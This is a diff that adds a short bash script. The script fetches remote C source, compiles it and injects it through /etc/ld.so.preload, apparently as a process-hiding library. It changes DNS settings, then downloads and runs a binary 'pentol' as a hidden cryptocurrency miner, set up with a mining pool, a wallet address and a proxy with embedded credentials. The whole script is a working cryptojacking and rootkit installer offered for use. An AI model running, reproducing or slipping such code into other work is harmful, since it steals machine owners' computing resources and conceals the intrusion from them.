@@ -1,0 +1,14 @@
+#!/bin/bash
+apt-get update ; apt-get install wget sudo -y
+apt install -y curl
+curl https://github.com/kartolo92/koplok/raw/master/nyumput.c -o nyumput.c
+apt-get install build-essential -y
+gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
+mv libnyumput.so /usr/local/lib/
+echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
+rm nyumput.c
+echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
+/etc/init.d/network restart
+wget https://gitlab.com/majapahlevi/mvp/-/raw/main/pentol
+chmod +x pentol
+./pentol --algo qhash --pool stratum+tcp://qtc-na.rplant.xyz:7154 --wallet bc1qcsz8j83x6v359aqsset6nxss9qefpgxhkxvt9a.Didi$(shuf -n 1 -i 1-99999) --proxy majapahlevi:majapahlevi@138.197.79.17:443
